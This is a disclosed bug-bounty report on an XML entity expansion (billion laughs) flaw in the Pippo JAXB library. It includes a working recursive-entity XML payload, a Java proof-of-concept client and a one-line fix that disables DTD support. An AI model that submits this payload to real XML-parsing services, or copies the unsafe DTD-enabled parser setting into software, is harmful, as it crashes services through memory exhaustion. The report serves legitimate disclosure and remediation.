# Pippo XML Entity Expansion (Billion Laughs Attack)

## Report Details
- **Report ID**: 506791
- **URL**: https://hackerone.com/reports/506791
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-08T15:19:48.688Z
- **Disclosed**: 2019-06-10T14:04:43.537Z

## Reporter
- **Username**: amassey
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: central-security-project

## Vulnerability Information
# Maven artifact
**groupId:** ro.pippo
**artifactId:** pippo-jaxb
**version:** 1.12.0

# Vulnerability
## Vulnerability Description
> Pippo unsafely parses user provided XML. The `fromString()` in the `ro.pippo.jaxb.JaxbEngine` class allows user provided DTDs that the rest of the XML may reference. This can lead to recursive entity expansion and a subsequent billion laughs attack.

## Additional Details
**Source File and Line Number:** https://github.com/pippo-java/pippo/blob/7da9f4db945d10113cf4ea4ed44ba0f1a7f83a8f/pippo-content-type-parent/pippo-jaxb/src/main/java/ro/pippo/jaxb/JaxbEngine.java#L78

## Steps To Reproduce:
> Detailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.

1. Supply below XML payload as an argument to the following Java main method which is a client of Pippo.
2. Enjoy watching the JVM crash.

### XML Payload that Results in Recursive Entity Expansion
```
<?xml version="1.0"?>
<!DOCTYPE PERSON [
        <!ENTITY PERSON "PERSON">
        <!ELEMENT PERSON (#PCDATA)>
        <!ENTITY PERSON1 "&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;">
        <!ENTITY PERSON2 "&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;">
        <!ENTITY PERSON3 "&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;">
        <!ENTITY PERSON4 "&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;">
        <!ENTITY PERSON5 "&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;">
        <!ENTITY PERSON6 "&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;">
        <!ENTITY PERSON7 "&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;">
        <!ENTITY PERSON8 "&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;">
        <!ENTITY PERSON9 "&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;">
        ]>

<PERSON>&PERSON9;</PERSON>
```

### Java Code that acts as a Pippo Client
```
import org.apache.commons.io.IOUtil;
import ro.pippo.jaxb.JaxbEngine;
import java.io.IOException;


public class JaxBEnginePoC {

    public static void main(String[] args) throws IOException {

        String resourceName = args[0];

        String payload = IOUtil.toString(
                JaxBEnginePoC.class.getResourceAsStream(resourceName),
                "UTF-8"
        );

        JaxbEngine jaxbEngine = new JaxbEngine();
        Object myObj = jaxbEngine.fromString(payload, Person.class);

        System.out.println("Completed!");
    }
}
```

## Patch
> If you're able to provide a patch with the fix, please post it in this section (or attach)

xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, true); 

Should Be

xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);

## Supporting Material/References:
> State all technical information about the stack where the vulnerability was found
- Darwin Kernel Version 18.2.0
- Java jdk1.8.0_171

# Wrap up
> Select Y or N for the following statements:
- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

> Finder's comments and funny memes goes here

http://i.imgur.com/3POtveC.jpg

Is it pronounced imgur or imgur? Gif or Gif?

## Impact

It causes a DoS. Specifically: Entities are created recursively and large amounts of heap memory is taken. Eventually, the JVM process will run out of memory. Otherwise, if the OS does not bound the memory on that process, memory will continue to be exhausted and will affect other processes on the system.

## Attachments
- pippo-poc-1.0-SNAPSHOT-sources.jar
